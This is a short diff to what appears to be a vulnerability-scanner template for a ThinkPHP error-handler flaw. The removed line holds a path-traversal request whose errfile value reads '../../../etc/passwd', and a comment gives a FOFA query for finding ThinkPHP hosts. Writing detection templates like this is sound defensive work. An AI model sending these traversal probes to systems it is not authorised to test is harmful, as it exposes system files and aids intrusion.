@@ -12,7 +12,7 @@ info:
 requests:
   - method: GET
     path:
-      - '{{BaseURL}}/?s=index/think\\Error/appError&errno=1&errstr=1&errline=1&errfile=../../../etc/passwd'
+      - '{{BaseURL}}/?s=index/think\\Error/appError&errno=1&errstr=1&errline=1&errfile=/www/'
 
 
     matchers-condition: and
@@ -24,5 +24,5 @@ requests:
 
       - type: status
         status:
-          - 200
+          - 500
 #fofa-query:"app="ThinkPHP""
